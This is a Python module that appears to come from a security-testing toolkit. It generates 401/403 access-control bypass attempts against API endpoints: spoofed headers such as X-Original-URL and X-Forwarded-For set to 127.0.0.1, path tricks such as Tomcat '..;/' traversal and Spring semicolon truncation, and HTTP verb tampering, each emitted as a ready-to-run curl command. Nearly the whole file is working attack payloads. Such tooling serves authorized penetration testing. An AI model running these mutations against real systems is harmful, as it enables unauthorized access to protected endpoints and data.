"""Automated API 401/403 Access Control Bypass Mutation Engine.

Generates header overrides, path transformations, verb tampering, and proxy rewrite
mutations inspired by nomore403 to test mobile API endpoints for reverse-proxy
authorization bypasses.
"""

from __future__ import annotations

from typing import Any
from urllib.parse import urlparse, urlunparse

HEADER_OVERRIDE_VECTORS = [
    ("X-Original-URL", "{path}", "Route override header for Spring / IIS reverse proxies"),
    ("X-Rewrite-URL", "{path}", "Apache / Nginx URL rewriting override"),
    ("X-Forwarded-For", "127.0.0.1", "Localhost spoofing for IP-whitelisted endpoints"),
    ("X-Forwarded-For", "localhost", "Hostname localhost spoofing"),
    ("X-Custom-IP-Authorization", "127.0.0.1", "Custom gateway authorization header"),
    ("X-Real-IP", "127.0.0.1", "Standard reverse-proxy real IP override"),
    ("X-Originating-IP", "127.0.0.1", "Legacy client IP header"),
    ("X-Remote-IP", "127.0.0.1", "Remote IP header injection"),
    ("X-Client-IP", "127.0.0.1", "Client IP spoofing"),
    ("X-Host", "127.0.0.1", "Host header injection"),
    ("X-Forwarded-Host", "localhost", "Virtual host spoofing"),
    ("X-Forwarded-Proto", "https", "Scheme protocol override"),
]

PATH_MUTATION_PATTERNS = [
    ("{path}/", "Trailing slash path normalization bypass"),
    ("{path}/.", "Dot segment resolution trick"),
    ("{path}/..;/", "Tomcat semicolon directory traversal bypass"),
    ("{path};", "Spring Framework path parameter truncation"),
    ("{path}.json", "Content negotiation extension append"),
    ("{path}?", "Query parameter delimiter append"),
    ("/%2e{path}", "URL-encoded dot prefix bypass"),
    ("{path}%20", "URL-encoded whitespace suffix"),
    ("{path}%09", "URL-encoded tab character suffix"),
    ("/{path_stripped}//", "Double slash duplicate separator bypass"),
]

ALTERNATIVE_METHODS = ["POST", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE"]


def generate_403_bypass_mutations(
    target_url: str,
    http_method: str = "GET",
    base_headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Generate structured HTTP mutation vectors to bypass 401/403 access controls."""
    parsed = urlparse(target_url)
    path = parsed.path or "/"
    path_stripped = path.lstrip("/")
    headers = dict(base_headers or {})

    mutations: list[dict[str, Any]] = []
    mutation_id = 1

    # 1. Header Overrides
    for h_name, h_val_template, rationale in HEADER_OVERRIDE_VECTORS:
        h_val = h_val_template.format(path=path)
        mut_headers = dict(headers)
        mut_headers[h_name] = h_val

        # If X-Original-URL or X-Rewrite-URL, often root path / is sent as URL path
        url_for_req = target_url
        if h_name in {"X-Original-URL", "X-Rewrite-URL"}:
            root_parts = list(parsed)
            root_parts[2] = "/"
            url_for_req = urlunparse(root_parts)

        header_flags = " ".join(f"-H '{k}: {v}'" for k, v in mut_headers.items())
        curl_cmd = f"curl -k -i -X {http_method} {header_flags} '{url_for_req}'"

        mutations.append(
            {
                "id": f"bypass_{mutation_id:03d}",
                "category": "HEADER_OVERRIDE",
                "name": f"Header {h_name}",
                "rationale": rationale,
                "method": http_method,
                "url": url_for_req,
                "headers": mut_headers,
                "curl_command": curl_cmd.replace("  ", " "),
            }
        )
        mutation_id += 1

    # 2. Path Transformations
    for p_template, rationale in PATH_MUTATION_PATTERNS:
        mut_path = p_template.format(path=path, path_stripped=path_stripped)
        parts = list(parsed)
        parts[2] = mut_path
        mut_url = urlunparse(parts)

        header_flags = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
        h_str = f" {header_flags}" if header_flags else ""
        curl_cmd = f"curl -k -i -X {http_method}{h_str} '{mut_url}'"

        mutations.append(
            {
                "id": f"bypass_{mutation_id:03d}",
                "category": "PATH_TAMPERING",
                "name": f"Path {mut_path}",
                "rationale": rationale,
                "method": http_method,
                "url": mut_url,
                "headers": headers,
                "curl_command": curl_cmd.strip(),
            }
        )
        mutation_id += 1

    # 3. HTTP Verb Tampering
    for alt_method in ALTERNATIVE_METHODS:
        if alt_method == http_method.upper():
            continue
        header_flags = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
        h_str = f" {header_flags}" if header_flags else ""
        curl_cmd = f"curl -k -i -X {alt_method}{h_str} '{target_url}'"

        mutations.append(
            {
                "id": f"bypass_{mutation_id:03d}",
                "category": "METHOD_TAMPERING",
                "name": f"Verb {alt_method}",
                "rationale": f"Test if access control policy is restricted to {http_method}",
                "method": alt_method,
                "url": target_url,
                "headers": headers,
                "curl_command": curl_cmd.strip(),
            }
        )
        mutation_id += 1

    breakdown: dict[str, int] = {}
    for m in mutations:
        cat = m["category"]
        breakdown[cat] = breakdown.get(cat, 0) + 1

    return {
        "status": "MUTATIONS_GENERATED",
        "target_url": target_url,
        "base_method": http_method.upper(),
        "total_mutations": len(mutations),
        "categories_breakdown": breakdown,
        "mutations": mutations,
    }
